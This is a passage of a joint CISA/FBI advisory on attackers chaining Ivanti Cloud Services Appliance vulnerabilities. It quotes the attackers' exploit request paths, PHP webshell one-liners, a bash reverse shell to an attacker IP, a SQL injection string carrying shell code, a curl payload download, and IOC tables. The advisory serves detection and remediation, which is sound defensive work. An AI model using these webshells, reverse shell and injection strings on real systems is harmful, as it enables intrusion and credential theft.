  <div class="c-page-title__inner l-constrain">
    <div class="c-page-title__row">
      <div class="c-page-title__content">
                  <div class="c-page-title__meta">Cybersecurity Advisory</div>
                <h1 class="c-page-title__title">
<span>Threat Actors Chained Vulnerabilities in Ivanti Cloud Service Applications</span>
</h1>
                                                          <div class="c-page-title__fields">  




<div  class="c-field c-field--name-field-release-date c-field--type-datetime c-field--label-above">
  <div  class="c-field__label">Release Date</div><div class="c-field__content"><time datetime="2025-01-22T12:00:00Z">January 22, 2025</time></div></div>

  




<div  class="c-field c-field--name-field-alert-code c-field--type-string c-field--label-above">
  <div  class="c-field__label">Alert Code</div><div class="c-field__content">AA25-022A</div></div>

</div>
                        
                  <div class="c-page-title__topic">
            <div class="c-topic__label"> Related topics: </div>
            <div class="c-top__topics">
                                                                              <a href="/topics/cybersecurity-best-practices/organizations-and-cyber-safety">Organizations and Cyber Safety</a>,                                                                                 <a href="/topics/cyber-threats-and-advisories">Cyber Threats and Advisories</a>,                                                                                 <a href="/topics/cyber-threats-and-advisories/incident-detection-response-and-prevention">Incident Detection, Response, and Prevention</a>                                          </div>
          </div>
        
      </div>
          </div>
    <div class="c-page-title__decoration"></div>
  </div>
</div>
    </div>
    <div class="l-full__main">
                      

<div  class="l-page-section l-page-section--rich-text">
      <div class="l-constrain">
  
  
  <div class="l-page-section__content">
          <p><strong>Note:&nbsp;</strong>The CVEs in this advisory are unrelated to vulnerabilities (CVE-2025-0282 and CVE-2025-0283) in Ivanti’s Connect Secure, Policy Secure and ZTA Gateways. For more information on mitigating CVE -2025-0282 and CVE-2025-0283, see <a href="https://www.cisa.gov/news-events/alerts/2025/01/08/ivanti-releases-security-updates-connect-secure-policy-secure-and-zta-gateways" title="Ivanti Releases Security Updates for Connect Secure, Policy Secure, and ZTA Gateways">Ivanti Releases Security Updates for Connect Secure, Policy Secure, and ZTA Gateways</a>.</p>
<h2><strong>Summary</strong></h2>
<p>The Cybersecurity and Infrastructure Security Agency (CISA) and Federal Bureau of Investigation (FBI) are releasing this joint Cybersecurity Advisory in response to exploitation in September 2024 of vulnerabilities in Ivanti Cloud Service Appliances (CSA): <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8963" title="CVE-2024-8963 Detail">CVE-2024-8963</a>, an administrative bypass vulnerability; <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9379" title="CVE-2024-9379 Detail">CVE-2024-9379</a>, a SQL injection vulnerability; and <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8190" title="CVE-2024-8190 Detail">CVE-2024-8190</a>&nbsp;and <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9380" title="CVE-2024-9380 Detail">CVE-2024-9380</a>, remote code execution vulnerabilities.</p>
<p>According to CISA and trusted third-party incident response data, threat actors chained the listed vulnerabilities to gain initial access, conduct remote code execution (RCE), obtain credentials, and implant webshells on victim networks. The actors’ primary exploit paths were two vulnerability chains. One exploit chain leveraged CVE-2024-8963 in conjunction with CVE-2024-8190 and CVE-2024-9380 and the other exploited CVE-2024-8963 and CVE-2024-9379. In one confirmed compromise, the actors moved laterally to two servers.</p>
<p>All four vulnerabilities affect Ivanti CSA version 4.6x versions before 519, and two of the vulnerabilities (CVE-2024-9379 and CVE-2024-9380) affect CSA versions 5.0.1 and below; according to Ivanti, these CVEs have not been exploited in version 5.0.[<a href="https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-CSA-Cloud-Services-Appliance-CVE-2024-9379-CVE-2024-9380-CVE-2024-9381?language=en_US" title="Security Advisory Ivanti CSA (Cloud Services Application) (CVE-2024-9379, CVE-2024-9380, CVE-2024-9381)">1</a>]</p>
<p>Ivanti CSA 4.6 is End-of-Life (EOL) and no longer receives patches or third-party libraries. CISA and FBI strongly encourage network administrators to upgrade to the latest supported version of Ivanti CSA.&nbsp;Network defenders are encouraged to hunt for malicious activity on their networks using the detection methods and indicators of compromise (IOCs) within this advisory. Credentials and sensitive data stored within the affected Ivanti appliances should be considered compromised. Organizations should collect and analyze logs and artifacts for malicious activity and apply the incident response recommendations within this advisory.</p>
<p>Download the PDF version of this report:</p>





<div class="c-file">
    <div class="c-file__download">
    <a href="/sites/default/files/2025-01/aa25-022a-threat-actors-chained-vulnerabilities-in-ivanti-cloud-service-applications_0.pdf" class="c-file__link" target="_blank">AA25-022A Threat Actors Chained Vulnerabilities in Ivanti Cloud Service Applications</a>
    <span class="c-file__size">(PDF,       756.33 KB
  )</span>
  </div>
</div>
<p>For a downloadable copy of IOCs, see:</p>





<div class="c-file">
    <div class="c-file__download">
    <a href="/sites/default/files/2025-01/AA25-022A.stix__0.xml" class="c-file__link" target="_blank">AA25-022A STIX XML</a>
    <span class="c-file__size">(XML,       104.25 KB
  )</span>
  </div>
</div>





<div class="c-file">
    <div class="c-file__download">
    <a href="/sites/default/files/2025-01/AA5-022A-Threat-Actors-Chain-Vulnerabilities-In-Ivanti-Cloud-Service-Applications.stix__0.json" class="c-file__link" target="_blank">AA25-022A STIX JSON</a>
    <span class="c-file__size">(JSON,       76.17 KB
  )</span>
  </div>
</div>
<h2><strong>Technical Details</strong></h2>
<p><strong>Note:</strong> This advisory uses the&nbsp;<a href="https://attack.mitre.org/versions/v16/matrices/enterprise/" title="Enterprise Matrix">MITRE ATT&amp;CK<sup>®</sup> Matrix for Enterprise</a> framework, version 16. See the <strong>MITRE ATT&amp;CK Tactics and Techniques</strong> section of this advisory for a table of the threat actors’ activity mapped to MITRE ATT&amp;CK tactics and techniques.</p>
<p>In September 2024, Ivanti released two Security Advisories disclosing exploitation of CVE-2024-8190 and&nbsp;CVE-2024-8963.[<a href="https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Cloud-Service-Appliance-CSA-CVE-2024-8190?language=en_US" title="Security Advisory Ivanti Cloud Service Appliance (CSA) (CVE-2024-8190)">2</a>][<a href="https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-CSA-4-6-Cloud-Services-Appliance-CVE-2024-8963?language=en_US" title="Security Advisory Ivanti CSA 4.6 (Cloud Services Appliance) (CVE-2024-8963)">3</a>] In October 2024, Ivanti released another advisory disclosing exploitation of CVE-2024-9379 and CVE-2024-9380.[<a href="https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-CSA-Cloud-Services-Appliance-CVE-2024-9379-CVE-2024-9380-CVE-2024-9381?language=en_US" title="Security Advisory Ivanti CSA (Cloud Services Application) (CVE-2024-9379, CVE-2024-9380, CVE-2024-9381)">1</a>]</p>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8963" title="CVE-2024-8963 Detail">CVE-2024-8963</a> [<a href="https://cwe.mitre.org/data/definitions/22.html" title="CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')">CWE-22: Path Traversal</a>] is an administrate bypass vulnerability that allows threat actors to remotely access restricted features within the appliance. When used in conjunction with CVE-2024-8190 [<a href="https://cwe.mitre.org/data/definitions/78.html" title="CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')">CWE-78: OS Command Injection</a>], threat actors can remotely authenticate into a victims’ network and execute arbitrary commands on the appliance [<a href="https://attack.mitre.org/versions/v16/techniques/T1219/" title="Remote Access Software">T1219</a>].[<a href="https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Cloud-Service-Appliance-CSA-CVE-2024-8190?language=en_US" title="Security Advisory Ivanti Cloud Service Appliance (CSA) (CVE-2024-8190)">2</a>][<a href="https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-CSA-4-6-Cloud-Services-Appliance-CVE-2024-8963?language=en_US" title="Security Advisory Ivanti CSA 4.6 (Cloud Services Appliance) (CVE-2024-8963)">3</a>]</li>
<li>CVE-2024-9379 [<a href="https://cwe.mitre.org/data/definitions/89.html" title="CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')">CWE-89: SQL Injection</a>] allows a remote authenticated attacker with admin privileges to run arbitrary SQL statements.[<a href="https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-CSA-Cloud-Services-Appliance-CVE-2024-9379-CVE-2024-9380-CVE-2024-9381?language=en_US" title="Security Advisory Ivanti CSA (Cloud Services Application) (CVE-2024-9379, CVE-2024-9380, CVE-2024-9381)">1</a>]</li>
<li>CVE-2024-9380 [<a href="https://cwe.mitre.org/data/definitions/77.html" title="CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')">CWE-77: Command Injection</a>] allows a remote authenticated attacker with admin privileges to obtain RCE.[<a href="https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-CSA-Cloud-Services-Appliance-CVE-2024-9379-CVE-2024-9380-CVE-2024-9381?language=en_US" title="Security Advisory Ivanti CSA (Cloud Services Application) (CVE-2024-9379, CVE-2024-9380, CVE-2024-9381)">1</a>]</li>
</ul>
<p>According to Ivanti’s advisories and industry reporting, these vulnerabilities were exploited as zero days.[<a href="https://www.fortinet.com/blog/threat-research/burning-zero-days-suspected-nation-state-adversary-targets-ivanti-csa" title="Burning Zero Days: Suspected Nation-State Adversary Targets Ivanti CSA">4</a>] Based on evidence of active exploitation, CISA added CVE-2024-8963, CVE-2024-8190, CVE-2024-9379, and CVE-2024-9380 to its&nbsp;<a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Known Exploited Vulnerabilities Catalog">Known Exploited Vulnerabilities (KEV) Catalog</a>.</p>
<p>According to CISA and trusted third-party incident response data, threat actors chained the above listed vulnerabilities to gain initial access, conduct RCE, obtain credentials, and implant webshells on victim networks. The primary exploit paths included two vulnerability chains. One exploit chain leveraged CVE-2024-8963 in conjunction with CVE-2024-8190 and CVE-2024-9380. The other chain exploited CVE-2024-8963 and CVE-2024-9379. After exploitation, the actors moved laterally in one victim—other victims had no follow-on activity because they identified anomalous activity and implemented mitigation measures.</p>
<h3>Exploit Chain 1</h3>
<p>The threat actors leveraged CVE-2024-8963 in conjunction with remote code execution vulnerabilities, CVE-2024-8190 and CVE-2024-9380. Acting as a&nbsp;<code>nobody</code> user [<a href="https://attack.mitre.org/versions/v16/techniques/T1564/002/" title="Hide Artifacts: Hidden Users">T1564.002</a>], the threat actors first sent a&nbsp;<code>GET</code> request to&nbsp;<code>datetime.php</code> to acquire session and cross-site request forgery (CSRF) tokens using&nbsp;<code>GET /client/index.php%3F.php/gsb/datetime[.]php</code> [<a href="https://attack.mitre.org/versions/v16/techniques/T1071/001/" title="Application Layer Protocol: Web Protocols">T1071.001</a>]. They followed this in quick succession with a&nbsp;<code>POST</code> request to the same endpoint, using the&nbsp;<code>TIMEZONE</code> input field to manipulate the&nbsp;<code>setSystemTimeZone</code> function and execute code. In some confirmed compromises, the actors used this method to run base64-encoded Python scripts that harvested encrypted admin credentials from the database [<a href="https://attack.mitre.org/versions/v16/techniques/T1552/001/" title="Unsecured Credentials: Credentials In Files">T1552.001</a>]. <strong>Note:</strong> The actors used multiple script variations. See <strong>Appendix A</strong> for examples of encoded and decoded scripts.</p>
<p>In some cases, the threat actors exfiltrated the encrypted admin credentials then decrypted them offline [<a href="https://attack.mitre.org/versions/v16/tactics/TA0010/" title="Exfiltration">TA0010</a>]. In other cases, the threat actors leveraged an executable matching the regular expression&nbsp;<code>php\w{6}</code> located in the /tmp directory to decrypt the credentials prior to exfiltration—this tool was unrecoverable.</p>
<p>After obtaining credentials, the actors logged in and exploited CVE-2024-9380 to execute commands from a higher privileged account. The actors successfully sent a&nbsp;<code>GET</code> request to&nbsp;<code>/gsb/reports[.]php</code>. They immediately followed this with a&nbsp;<code>POST</code> request using the&nbsp;<code>TW_ID</code> input field to execute code to implant webshells for persistence [<a href="https://attack.mitre.org/versions/v16/techniques/T1505/003/" title="Server Software Component: Web Shell">T1505.003</a>].</p>
<p>In one confirmed compromise, the threat actors tried to create webshells using two different paths:</p>
<ul>
<li><code>echo "&lt;?php system(@</code><br><code>\$_REQUEST['a']);"&gt;/opt/ivanti/csa/broker/webroot/client/help.php</code></li>
<li><code>echo "&lt;?php system('/bin/sudo '. @</code><br><code>\$_REQUEST['a']);" &gt; /opt/landesk/broker/webroot/gsb/help.php</code></li>
</ul>
<p>In the same compromise, the actors used the exploit to execute the following script to create a reverse Transmission Control Protocol command and control (C2) channel:&nbsp;<code>bash -i &gt;&amp;/dev/tcp/107.173.89[.]16/8000 0&gt;&amp;1</code>.</p>
<p>In another compromise, the threat actors maintained their presence on the victim’s system for a longer amount of time. The threat actors used&nbsp;<code>sudo</code> commands to disable the vulnerability in&nbsp;<code>DateTimeTab.php</code>, modify and remove webshells, and remove evidence of exploitation [<a href="https://attack.mitre.org/versions/v16/techniques/T1548/003/" title="Abuse Elevation Control Mechanism: Sudo and Sudo Caching">T1548.003</a>]. See <strong>Appendix B</strong> for the list of&nbsp;<code>sudo</code> commands used.</p>
<h4><strong>Lateral Movement</strong></h4>
<p>In one case, there was evidence of lateral movement after the threat actors gained access and established a foothold through this exploit chain. It is suspected that the threat actors gained access into a Jenkins server running a vulnerable, outdated version [<a href="https://attack.mitre.org/versions/v16/techniques/T1068/" title="Exploitation for Privilege Escalation">T1068</a>]. Logs on the Jenkins machine showed that a command in the bash history contained credentials to the postgres server. The threat actors then attempted to log into the Virtual Private Network (VPN) server but were unsuccessful. Prior to moving laterally, the actors likely performed discovery on the CSA device using Obelisk and GoGo to scan for vulnerabilities [<a href="https://attack.mitre.org/versions/v16/techniques/T1595/002/" title="Active Scanning: Vulnerability Scanning">T1595.002</a>].</p>
<h3>Exploit Chain 2</h3>
<p>In one confirmed compromise, the actors used a similar exploit chain, exploiting CVE-2024-8963 in conjunction with CVE-2024-9379, using&nbsp;<code>GET /client/index.php%3f.php/gsb/broker.php</code> for initial access.</p>
<p>After the threat actors gained initial access, they attempted to exploit CVE-2024-9379 to create a webshell to gain persistent access. They executed&nbsp;<code>GET</code> and&nbsp;<code>POST</code> requests in quick succession to&nbsp;<code>/client/index.php%3F.php/gsb/broker.php</code>. In the&nbsp;<code>POST</code> body, threat actors entered the following string in the lockout attempts input box:&nbsp;<code>LOCKOUTATTEMPTS = 1 ;INSERT INTO user_info(username, accessed, attempts) VALUES ('''echo -n TnNhV1Z1ZEM5b1pXeHdMbk&gt;&gt;/.k''', NOW(), 10)</code>. The first portion of the command&nbsp;(LOCKOUTATTEMPTS=1) fit the format of the application and was properly handled by the application. However, the second portion of the command, a SQL injection [<a href="https://attack.mitre.org/versions/v16/techniques/T1190/" title="Exploit Public-Facing Application">T1190</a>], was not properly handled by the application. Regardless, the application processed both commands, allowing the threat actors to insert a user into the&nbsp;<code>user_info</code> table.</p>
<p>After inserting valid bash code as a user in the&nbsp;<code>user_info</code> table, the threat actors attempted to login as the user. The authoring agencies believe the threat actors knew this login would fail but were attempting to coerce the application into handling the bash code improperly. In this attempt, the application did not evaluate the validity of the login, but instead ran&nbsp;<code>echo -n TnNhV1Z1ZEM5b1pXeHdMbk&gt;&gt;./k</code> as if it were code. The threat actors repeated the process of echo commands until they built a valid web shell [<a href="https://attack.mitre.org/versions/v16/techniques/T1059/" title="Command and Scripting Interpreter">T1059</a>]. However, there were no observations that the threat actors were successful.</p>
<h3>Detection of Activity</h3>
<p>According to incident response data from three victim organizations, the actors were unsuccessful with follow-on activity due to the organizations’ rapid detection of the malicious activity. To remediate exploitation, all three organizations replaced the virtual machines with clean and upgraded versions.</p>
<h4><strong>Victim Organization 1</strong></h4>
<p>The first organization detected malicious activity early in the exploitation. A system administrator detected the anomalous creation of user accounts. After investigation, the organization remediated the incident. While it is likely admin credentials were exfiltrated, there were no signs of lateral movement.</p>
<h4><strong>Victim Organization 2</strong></h4>
<p>This organization had an endpoint protection platform (EPP) installed on their system that alerted when the threat actors executed base64 encoded script to create webshells. There were no indications of webshells successfully being created or of lateral movement.</p>
<h4><strong>Victim Organization 3</strong></h4>
<p>This organization leveraged the IOC findings from the other two victim sites to quickly detect malicious activity. This threat activity included the download and deployment of Obelisk and GoGo Scanner, which generated a large number of logs. The organization used these logs to identify anomalous activity.</p>
<h2><strong>Indicators of Compromise</strong></h2>
<p>See <strong>Table 1</strong> through <strong>Table 3</strong> for IOCs related to the threat actors’ exploitation of CVE-2024-8963, CVE-2024-8190, CVE-2024-9379, and CVE-2024-9380 in Ivanti CSA.</p>
<p><strong>Disclaimer:</strong> Some IP addresses in this cybersecurity advisory may be associated with legitimate activity. Organizations are encouraged to investigate the activity around these IP addresses prior to taking action, such as blocking. Activity should not be attributed as malicious without analytical evidence to support they are used at the direction of, or controlled by, threat actors.</p>
<div>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap>
<caption><em>Table&nbsp;1: IP Address Used for Credential Theft, September 2024</em></caption>
<thead>
<tr>
<th role="columnheader" data-tablesaw-priority="persist">File Name</th>
<th role="columnheader">IP Address</th>
<th role="columnheader">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>"/client/index.php%3f.php/gsb/datetime.php</td>
<td>142.171.217[.]195</td>
<td>/var/log/messages</td>
</tr>
<tr>
<td>"/client/index.php%3f.php/gsb/datetime.php</td>
<td>154.64.226[.]166</td>
<td>/var/log/messages-20240904.gz</td>
</tr>
<tr>
<td>"/client/index.php%3f.php/gsb/datetime.php</td>
<td>216.131.75[.]53</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>"/client/index.php%3f.php/gsb/datetime.php</td>
<td>23.236.66[.]97</td>
<td>/var/log/messages-20240905.gz</td>
</tr>
<tr>
<td>"/client/index.php%3f.php/gsb/datetime.php</td>
<td>38.207.159[.]76</td>
<td>/var/log/messages-20240906.gz</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap>
<caption><em>Table 2: Survey 2, Ivanti CSA Network IOC List, September 2024</em></caption>
<thead>
<tr>
<th role="columnheader" data-tablesaw-priority="persist">File Name</th>
<th role="columnheader">IP Address</th>
<th role="columnheader">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>&nbsp;</td>
<td>149.154.167[.]41</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>&nbsp;</td>
<td>95.161.76[.]100</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>hxxps://file.io/E50vtqmJP5aa</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>hxxps://file.io/RBKuU8gicWt</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>hxxps://file.io/frdZ9L18R7Nx</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>hxxp://ip.sb</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>
<p>hxxps://pan.xj.hk/d/</p>
<p>6401646e701f5f47518ecef48a308a36/redis</p>
</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>&nbsp;</td>
<td>142.171.217[.]195</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>&nbsp;</td>
<td>108.174.199[.]200</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>&nbsp;</td>
<td>206.189.156[.]69</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>&nbsp;</td>
<td>108.174.199[.]200/Xa27efd2.tmp</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>&nbsp;</td>
<td>142.171.217[.]195</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap>
<caption><em>Table&nbsp;3: Additional IOCs Derived from Incident Response, September 2024</em></caption>
<thead>
<tr>
<th role="columnheader" data-tablesaw-priority="persist">Type</th>
<th role="columnheader">IOC</th>
<th role="columnheader">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>Ipv4</td>
<td>107.173.89[.]16</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>38.207.159[.]76</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>142.171.217[.]195</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>154.64.226[.]166</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>156.234.193[.]18</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>216.131.75[.]53</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>205.169.39[.]11</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>23.236.66[.]97</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>149.154.176[.]41</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>95.161.76[.]100</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>142.171.217[.]195</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>108.174.199[.]200</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>206.189.156[.]69</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>142.171.217[.]195</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>67.217.228[.]83</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>203.160.72[.]174</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>142.11.217[.]3</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>104.168.133[.]228</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>64.176.49[.]160</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>45.141.215[.]17</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>142.171.217[.]195</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>98.101.25[.]30</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>216.131.75[.]53</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>134.195.90[.]71</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>23.236.66[.]97</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Hash</td>
<td>a50660fb31df96b3328640fdfbeea755</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Hash</td>
<td>53c5b7d124f13039eb62409e1ec2089d</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Hash</td>
<td>698a752ec1ca43237cb1dc791700afde</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Hash</td>
<td>aa69300617faab4eb39b789ebfeb5abe</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Hash</td>
<td>c2becc553b96ba27d60265d07ec3bd6c</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Hash</td>
<td>cacc30e2a5b2683e19e45dc4f191cebc</td>
<td>/opt/ivanti/csa/broker/webroot/client/help.php</td>
</tr>
<tr>
<td>Hash</td>
<td>061e5946c9595e560d64d5a8c65be49e</td>
<td>/opt/landesk/broker/webroot/gsb/view.php</td>
</tr>
<tr>
<td>Hash</td>
<td>
<p>e35cf026057a3729387b7ecfb213ae</p>
<p>62a611f0f1a418876b11c9df3b56885bed</p>
</td>
<td>/tmp/brokerdebug</td>
</tr>
<tr>
<td>Hash</td>
<td>c7d20ca6fe596009afaeb725fec8635f</td>
<td>/opt/landesk/broker/webroot/gsb/help.php</td>
</tr>
<tr>
<td>Hash</td>
<td>F7F81AE880A17975F60E1E0FE1A4048B</td>
<td>/opt/landesk/broker/webroot/gsb/DateTimeTab.php</td>
</tr>
<tr>
<td>Hash</td>
<td>86B62FFD33597FD635E01B95F08BB996</td>
<td>/opt/landesk/broker/webroot/gsb/style.php</td>
</tr>
<tr>
<td>Hash</td>
<td>DD975310201079CACD4CDE6FACAB8C1D</td>
<td>/opt/landesk/broker/webroot/client/index.php</td>
</tr>
<tr>
<td>Hash</td>
<td>1B20E9310CA815F9E2BD366FB94E147F</td>
<td>
<p>/sbin/systemd &nbsp;</p>
<p>Configuration file at /WpService.conf</p>
</td>
</tr>
<tr>
<td>Hash</td>
<td>30f57e14596f1bcad7cc4284d1af4684</td>
<td>
<p>/sbin/systemd&nbsp;</p>
<p>Configuration file at /WpService.conf</p>
</td>
</tr>
<tr>
<td>URL</td>
<td>hxxps://file.io/E50vtqmJP5aa</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>URL</td>
<td>hxxps://file.io/RBKuU8gicWt</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>URL</td>
<td>hxxps://file.io/frdZ9L18R7Nx</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>URL</td>
<td>hxxp://ip.sb</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>URL</td>
<td>
<p>hxxps://pan.xj.hk/d/</p>
<p>6401646e701f5f47518ecef48a308a36/redis</p>
</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>URL</td>
<td>108.174.199.200/Xa27efd2.tmp</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>URL</td>
<td>45.33.101.53/log</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>URL</td>
<td>45.33.101.53/log2</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>URL</td>
<td>208.184.237.75/fdsupdate</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>URL</td>
<td>173.243.138.76/fdsupdate</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>URL</td>
<td>cri07nnrg958pkh6qhk0977u8c83jog6t.oast[.]fun</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>URL</td>
<td>cri07nnrg958pkh6qhk0yrgy1e76p1od6.oast[.]fun</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>domain</td>
<td>gg.oyr2ohrm.eyes[.]sh</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>domain</td>
<td>ggg.oyr2ohrm.eyes[.]sh</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>domain</td>
<td>gggg.oyr2ohrm.eyes[.]sh</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>domain</td>
<td>txt.xj[.]hk</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>domain</td>
<td>book.hacktricks[.]xyz</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>host</td>
<td>sh -c setsid /dev/shm/redis &amp;</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>host</td>
<td>
<p>sh -c curl -k https://file[.]io/1zqvMYY1dpkk -o</p>
<p>/dev/shm/redis2</p>
</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>host</td>
<td>sh -c mv /dev/shm/redis2 /dev/shm/redis</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>host</td>
<td>sh -c rm /dev/shm/*</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>host</td>
<td>rm /dev/shm/PostgreSQL.1014868572 /dev/shm/redis</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>host</td>
<td>78cc672218949a9ec87407ad3bcb5db6</td>
<td>Agent.zip</td>
</tr>
<tr>
<td>host</td>
<td>d13f71e51b38ffef6b9dc8efbed27615</td>
<td>Log.log</td>
</tr>
<tr>
<td>host</td>
<td>d88bfac2b43509abdc70308bef75e2a6</td>
<td>Log.exe</td>
</tr>
<tr>
<td>host</td>
<td>R.exe (MD5: 60d5648d35bacf5c7aa713b2a0d267d3)</td>
<td>R.exe</td>
</tr>
<tr>
<td>host</td>
<td>ae51c891d2e895b5ca919d14edd42c26</td>
<td>CAService.exe</td>
</tr>
<tr>
<td>host</td>
<td>d88bfac2b43509abdc70308bef75e2a6</td>
<td>Lgfxsys.exe</td>
</tr>
<tr>
<td>host</td>
<td>f82847bccb621e6822a3947bc9ce9621</td>
<td>NetlO.cfg</td>
</tr>
<tr>
<td>host</td>
<td>c894f55c8fa9d92e2dd2c78172cff745</td>
<td>XboVFyKw.tmp</td>
</tr>
<tr>
<td>host</td>
<td>MD5: Unknown</td>
<td>Wi.bat</td>
</tr>
<tr>
<td>host</td>
<td>MD5: Unknown</td>
<td>dCUgGXfm.tmp</td>
</tr>
<tr>
<td>host</td>
<td>MD5: Unknown</td>
<td>DijZViHC.tmp</td>
</tr>
<tr>
<td>/var/secure log</td>
<td>nobody : user NOT in sudoers ; TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ; USER=root ; COMMAND=/bin/ln -sf</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>/var/secure log</td>
<td>nobody : user NOT in sudoers ; TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ; USER=root ; COMMAND=/bin/mv /tmp/php.ini /etc/php.ini</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>/var/secure log</td>
<td>nobody : user NOT in sudoers ; TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ; USER=root ; COMMAND=/sbin/hwclock --localtime --systohc&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>/var/secure log</td>
<td>nobody : user NOT in sudoers ; TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ; USER=root ; COMMAND=/subin/backuptool --fullList</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>142.171.217[.]195</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>107.173.89[.]16</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>192.42.116[.]210</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>82.197.182[.]161</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>154.213.185[.]230</td>
<td>&nbsp;</td>
</tr>
<tr>
